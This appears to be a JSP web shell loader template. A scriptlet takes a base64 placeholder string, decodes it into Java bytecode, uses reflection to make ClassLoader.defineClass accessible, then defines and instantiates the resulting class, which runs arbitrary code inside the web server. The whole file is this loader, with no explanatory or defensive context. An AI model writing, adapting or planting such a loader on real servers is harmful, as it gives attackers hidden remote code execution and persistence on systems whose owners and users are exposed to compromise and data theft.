<%
    String base64Str = "{{base64Str}}";
    byte[] bytecode = null;
    try {
        Class base64Clz = Class.forName("java.util.Base64");
        Object decoder = base64Clz.getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
        bytecode = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{base64Str});
    } catch (ClassNotFoundException ee) {
        Class datatypeConverterClz = Class.forName("javax.xml.bind.DatatypeConverter");
        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", new Class[]{String.class}).invoke(null, new Object[]{base64Str});
    }
    java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE});
    defineClass.setAccessible(true);
    Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{bytecode, new Integer(0), new Integer(bytecode.length)});
    clazz.newInstance();
%>
